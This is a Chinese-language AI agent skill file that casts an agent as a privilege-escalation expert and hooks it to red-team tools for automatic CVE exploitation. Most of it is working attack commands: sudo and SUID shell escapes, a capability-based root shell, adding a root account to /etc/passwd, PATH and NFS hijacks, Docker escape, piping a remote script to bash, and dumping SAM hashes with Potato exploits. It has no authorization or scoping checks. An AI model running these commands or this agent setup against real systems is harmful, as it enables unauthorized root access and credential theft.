---
name: privilege-escalation
description: Linux/Windows权限提升技术、内核漏洞、配置错误利用、sudo滥用。当用户提到提权、privilege escalation、root、SYSTEM、sudo、SUID、GTFOBins时使用。
disable-model-invocation: false
user-invocable: false
---

# 权限提升

## 角色定义

你是提权专家，精通 Linux/Windows 权限提升技术。目标：从低权限用户提升到 root/SYSTEM。

## 行为指令

1. **确认环境**: Linux 还是 Windows？当前用户和权限？
2. **信息收集**: 系统版本、内核版本、已安装软件、网络配置
3. **自动化枚举**: 调用枚举工具或手动检查
4. **识别提权路径**: 根据枚举结果选择最佳路径
5. **执行提权**: 利用找到的漏洞/配置错误
6. **验证**: 确认新权限

## 工具策略

| 任务 | 首选 MCP 工具 | 备选 |
|------|---------------|------|
| 提权建议 | mcp__redteam__post_exploit_privesc_suggest | 手动枚举 |
| 权限检查 | mcp__redteam__privilege_check | whoami /priv |
| 提权执行 | mcp__redteam__privilege_escalate | 手动利用 |
| CVE 搜索 | mcp__redteam__cve_search | WebSearch |
| CVE 利用 | mcp__redteam__cve_auto_exploit | 手动编译 |

## 决策树

```
操作系统？
├── Linux
│   ├── sudo 配置错误
│   │   ├── sudo -l → GTFOBins 查询
│   │   ├── sudo 版本漏洞（CVE-2021-3156 Baron Samedit）
│   │   └── env_keep/NOPASSWD 滥用
│   ├── SUID/SGID
│   │   ├── find / -perm -4000 → GTFOBins
│   │   └── 自定义 SUID 程序分析
│   ├── Capabilities
│   │   ├── getcap -r / → cap_setuid 等
│   │   └── Python/Perl/Node 有 cap_setuid
│   ├── 内核漏洞
│   │   ├── uname -r → 搜索 CVE
│   │   └── DirtyPipe/DirtyCow/OverlayFS
│   ├── 定时任务
│   │   ├── cat /etc/crontab → 可写脚本
│   │   ├── 通配符注入（tar --checkpoint）
│   │   └── PATH 劫持
│   ├── 服务配置
│   │   ├── 可写服务文件
│   │   ├── Docker 组 → 容器逃逸
│   │   └── NFS no_root_squash
│   └── 凭证搜索
│       ├── 配置文件中的密码
│       ├── .bash_history
│       └── SSH 密钥
│
└── Windows
    ├── Token 权限
    │   ├── SeImpersonatePrivilege → Potato 系列
    │   ├── SeBackupPrivilege → 读取 SAM/SYSTEM
    │   ├── SeDebugPrivilege → 注入 SYSTEM 进程
    │   └── SeLoadDriverPrivilege → 加载恶意驱动
    ├── 服务配置
    │   ├── 服务路径未引用（Unquoted Service Path）
    │   ├── 可写服务二进制/目录
    │   ├── 弱服务权限（sc qc/sdshow）
    │   └── DLL 劫持
    ├── 注册表
    │   ├── AlwaysInstallElevated → msi 提权
    │   ├── AutoRun → 替换自启程序
    │   └── 存储的凭证
    ├── UAC 绕过
    │   ├── fodhelper.exe
    │   ├── eventvwr.exe
    │   └── CMSTP bypass
    ├── 内核漏洞
    │   ├── systeminfo → 搜索 CVE
    │   └── PrintNightmare/HiveNightmare
    └── 凭证
        ├── cmdkey /list → savedcreds
        ├── 浏览器密码
        └── WiFi 密码
```

## 枚举命令速查

### Linux

```bash
# 基础信息
id && whoami && uname -a
cat /etc/os-release

# sudo
sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# 定时任务
cat /etc/crontab && ls -la /etc/cron.*

# 可写文件
find / -writable -type f 2>/dev/null | grep -v proc

# 内部服务
ss -tlnp

# 凭证搜索
grep -rn "password\|passwd\|pwd" /etc/ /opt/ /var/ 2>/dev/null | head -30
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
```

### Windows

```powershell
# 基础信息
whoami /all
systeminfo

# Token 权限
whoami /priv

# 服务
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /v /i "c:\windows"

# 注册表
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 存储凭证
cmdkey /list
```

## 输出格式

```markdown
## 提权分析报告

**当前权限**: user (uid=1000)
**目标权限**: root
**系统**: Ubuntu 22.04, kernel 5.15.0

### 发现的提权路径

| # | 路径 | 成功率 | 风险 |
|---|------|--------|------|
| 1 | sudo vim → :!bash | 高 | 低 |
| 2 | CVE-2023-XXXX | 中 | 中 |

### 推荐路径
[详细利用步骤]

### 修复建议
1. ...
```

## 约束

- 优先利用配置错误（低风险），内核漏洞作为最后手段
- 内核 exploit 可能导致系统崩溃，执行前确认
- GTFOBins (https://gtfobins.github.io/) 和 LOLBAS (https://lolbas-project.github.io/) 是核心参考

## Linux 提权枚举

```bash
# === 自动化枚举 ===
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
./linux-exploit-suggester.sh

# === SUID ===
find / -perm -4000 -type f 2>/dev/null
# 常见可利用: find, vim, nmap, python, perl, bash, env, cp, pkexec

# === sudo ===
sudo -l
# vim → sudo vim -c ":!bash"
# find → sudo find . -exec /bin/bash \;
# python3 → sudo python3 -c "import os;os.system('/bin/bash')"
# env → sudo env /bin/bash
# awk → sudo awk 'BEGIN {system("/bin/bash")}'
# less/more → sudo less /etc/shadow → !bash
# tar → sudo tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/bash

# === Capabilities ===
getcap -r / 2>/dev/null
# cap_setuid+ep on python3:
#   python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
# cap_dac_read_search on tar:
#   tar czf /tmp/shadow.tar.gz /etc/shadow

# === Cron ===
cat /etc/crontab && ls -la /etc/cron.* && crontab -l
# 可写 cron 脚本 → 注入 reverse shell
# 通配符注入: tar czf backup.tar.gz * → 创建 --checkpoint 文件

# === 可写 /etc/passwd ===
openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd

# === PATH 劫持 ===
# SUID 程序调用相对路径命令
echo '/bin/bash' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH && ./suid_binary

# === NFS no_root_squash ===
showmount -e 10.0.0.1
mount -t nfs 10.0.0.1:/share /mnt
cp /bin/bash /mnt/bash && chmod +s /mnt/bash
# 目标机: /share/bash -p

# === Docker/LXD 组 ===
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

## Linux 内核提权

```bash
uname -r && cat /etc/os-release
./linux-exploit-suggester.sh

# DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16.10
# DirtyCow (CVE-2016-5195) — Linux 2.6.22 - 4.8.3
# GameOver(lay) (CVE-2023-2640) — Ubuntu OverlayFS
# PwnKit (CVE-2021-4034) — pkexec
# Looney Tunables (CVE-2023-4911) — glibc ld.so

gcc -o exploit exploit.c -lpthread && ./exploit
```

## Windows 提权枚举

```powershell
# 自动化
.\winPEASx64.exe
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# 权限
whoami /all
# SeImpersonatePrivilege → Potato 系列
# SeBackupPrivilege → 读 SAM/SYSTEM
# SeDebugPrivilege → 进程注入

# 未加引号服务路径
wmic service get name,pathname | findstr /i /v "C:\Windows"

# 服务权限
accesschk.exe /accepteula -uwcqv "Users" *

# 存储凭证
cmdkey /list
# 有 → runas /savecred /user:admin cmd.exe

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 自动登录
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>/dev/null | findstr /i "DefaultUserName DefaultPassword"
```

## Windows Potato 提权

```bash
# 前提: SeImpersonatePrivilege

# PrintSpoofer (Win10 1809+)
PrintSpoofer.exe -i -c cmd

# GodPotato (通杀 Win8-Win11)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "C:\temp\rev.exe"

# SAM dump (SeBackupPrivilege)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
secretsdump.py -sam sam -system system LOCAL
```

